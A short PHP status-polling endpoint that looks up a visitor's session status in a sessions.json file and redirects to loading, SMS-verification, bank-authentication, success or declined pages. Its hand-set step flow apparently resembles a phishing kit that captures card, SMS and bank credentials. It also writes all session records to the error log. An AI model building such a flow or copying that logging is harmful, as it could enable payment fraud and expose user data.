<?php
session_start();
header('Content-Type: application/json');

$sessionsFile = 'sessions.json';
$sessionId = $_GET['session'] ?? '';

// Get store ID from session
$storeId = $_SESSION['current_store_id'] ?? null;
$storeParam = $storeId ? "?store=" . urlencode($storeId) : '';

error_log("Checking status for session: " . $sessionId);

if (file_exists($sessionsFile)) {
    $sessions = json_decode(file_get_contents($sessionsFile), true);
    error_log("All sessions: " . print_r($sessions, true));
    
    if (isset($sessions[$sessionId])) {
        $status = $sessions[$sessionId]['status'] ?? 'loading';
        error_log("Found status for session {$sessionId}: {$status}");

        // Define redirect URL based on status
        $redirectUrl = '';
        switch ($status) {
            case 'success':
                $redirectUrl = '/success.php';
                break;
            case 'sms':
                $redirectUrl = '/sms_verification.php';
                break;
            case 'bank':
                $redirectUrl = '/bank_auth.php';
                break;
            case 'declined':
                $redirectUrl = '/index.php';
                // Add error parameter for declined status
                $storeParam .= ($storeParam ? '&' : '?') . 'error=payment_declined';
                break;
            case 'loading':
                $redirectUrl = '/loading.php';
                break;
            default:
                $redirectUrl = '/loading.php';
        }

        echo json_encode([
            'status' => $status,
            'redirect' => $redirectUrl . $storeParam
        ]);
        exit;
    } else {
        error_log("Session {$sessionId} not found in sessions file");
    }
}

error_log("Returning default loading status");
echo json_encode([
    'status' => 'loading',
    'redirect' => '/loading.php' . $storeParam
]); 